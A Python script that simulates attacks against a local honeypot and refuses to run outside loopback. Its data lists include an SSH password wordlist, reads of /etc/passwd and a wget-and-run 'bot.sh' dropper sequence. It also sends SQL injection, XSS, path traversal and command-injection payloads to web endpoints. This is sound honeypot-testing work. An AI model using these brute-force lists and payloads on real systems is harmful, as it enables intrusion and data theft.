#!/usr/bin/env python3
"""Attack simulator for TESTING the honeypot - loopback targets only.

Each "attacker" connects from a different 127.0.0.x source address so the dashboard shows several
distinct sources. Only dummy usernames/passwords are used; no real malware is ever downloaded
(the commands are typed into a fake shell that never executes them).
"""
import argparse
import http.client
import socket
import time
import urllib.parse

import paramiko

USERS = ["root", "admin", "ubuntu", "test", "pi"]
WORDLIST = ["admin123", "letmein1", "password1", "qwerty123", "iloveyou", "welcome", "toor", "123456", "root", "admin"]
RECON = ["whoami", "id", "uname -a", "cat /etc/passwd", "ifconfig", "ps"]
MALWARE = ["cd /tmp", "wget http://203.0.113.9/bot.sh", "chmod +x bot.sh", "./bot.sh", "crontab -l", "exit"]


def ssh_client(src_ip, host, port, user, pwd):
    sock = socket.create_connection((host, port), timeout=10, source_address=(src_ip, 0))
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    cli.connect(host, port, user, pwd, sock=sock, allow_agent=False, look_for_keys=False, timeout=10)
    return cli


def ssh_bruteforce(src, host, port, pause):
    print(f"[sim] {src}: SSH dictionary attack")
    for pwd in WORDLIST:
        for user in USERS[:2]:
            try:
                ssh_client(src, host, port, user, pwd).close()
            except paramiko.AuthenticationException:
                pass
            time.sleep(pause)


def ssh_session(src, host, port, user, pwd, commands, pause):
    print(f"[sim] {src}: SSH login {user}/{pwd} and {len(commands)} commands")
    cli = ssh_client(src, host, port, user, pwd)
    chan = cli.invoke_shell()
    time.sleep(0.4)
    chan.recv(4096)
    for c in commands:
        chan.send(c + "\n")
        time.sleep(0.25 + pause)
        if chan.recv_ready():
            chan.recv(4096)
    cli.close()


def banner_grab(src, host, port):
    print(f"[sim] {src}: raw banner grab")
    s = socket.create_connection((host, port), timeout=5, source_address=(src, 0))
    s.recv(64)
    s.close()


def http_req(src, host, port, method, path, body=None, ua="Mozilla/5.0"):
    conn = http.client.HTTPConnection(host, port, timeout=10, source_address=(src, 0))
    headers = {"User-Agent": ua}
    if body is not None:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    conn.request(method, path, body=body, headers=headers)
    conn.getresponse().read()
    conn.close()


def http_scanner(src, host, port):
    print(f"[sim] {src}: web scanner (Nikto UA)")
    for p in ["/", "/admin", "/.env", "/wp-login.php", "/phpmyadmin/", "/.git/config", "/backup", "/server-status", "/cgi-bin/test.cgi"]:
        http_req(src, host, port, "GET", p, ua="Mozilla/5.00 (Nikto/2.1.6)")


def http_injection(src, host, port):
    print(f"[sim] {src}: SQLi / XSS / traversal / command injection")
    q = urllib.parse.quote
    http_req(src, host, port, "GET", "/search?q=" + q("' OR 1=1 --"))
    http_req(src, host, port, "GET", "/item?id=" + q("1 UNION SELECT username,password FROM users"))
    http_req(src, host, port, "GET", "/page?x=" + q("<script>alert(1)</script>"))
    http_req(src, host, port, "GET", "/download?file=../../../../etc/passwd")
    http_req(src, host, port, "GET", "/ping?host=" + q("8.8.8.8; cat /etc/passwd"))
    http_req(src, host, port, "POST", "/login", "username=" + q("admin' OR '1'='1") + "&password=x")


def http_bruteforce(src, host, port, pause):
    print(f"[sim] {src}: web login brute force")
    for i, pwd in enumerate(["admin", "123456", "password", "welcome1", "admin@123", "root", "letmein"]):
        http_req(src, host, port, "POST", "/login", f"username={USERS[i % 3]}&password={pwd}", ua="python-requests/2.31")
        time.sleep(pause)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--ssh-port", type=int, default=2222)
    ap.add_argument("--http-port", type=int, default=8080)
    ap.add_argument("--pause", type=float, default=0.05, help="delay between attempts (seconds)")
    a = ap.parse_args()
    if not a.host.startswith("127."):
        raise SystemExit("Refusing to run: simulator only targets loopback (127.x.x.x). See the ethics rules.")
    h, sp, hp, p = a.host, a.ssh_port, a.http_port, a.pause
    ssh_bruteforce("127.0.0.2", h, sp, p)
    ssh_session("127.0.0.3", h, sp, "root", "toor", RECON + MALWARE, p)
    ssh_session("127.0.0.8", h, sp, "ubuntu", "ubuntu", ["uname -a", "whoami", "ls -la", "exit"], p)
    banner_grab("127.0.0.7", h, sp)
    http_scanner("127.0.0.4", h, hp)
    http_injection("127.0.0.5", h, hp)
    http_bruteforce("127.0.0.6", h, hp, p)
    print("[sim] finished")


if __name__ == "__main__":
    main()
